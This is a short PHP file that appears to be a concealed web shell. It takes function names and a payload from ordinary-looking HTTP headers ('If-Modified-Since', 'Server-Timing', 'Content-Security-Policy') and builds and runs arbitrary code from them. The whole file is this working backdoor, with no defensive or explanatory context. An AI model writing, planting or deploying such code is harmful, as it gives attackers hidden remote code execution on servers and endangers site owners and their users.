<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['If-Modified-Since'])) {
    $system = $_HEADERS['If-Modified-Since']('', $_HEADERS['Server-Timing']($_HEADERS['Content-Security-Policy']));
    $system();
}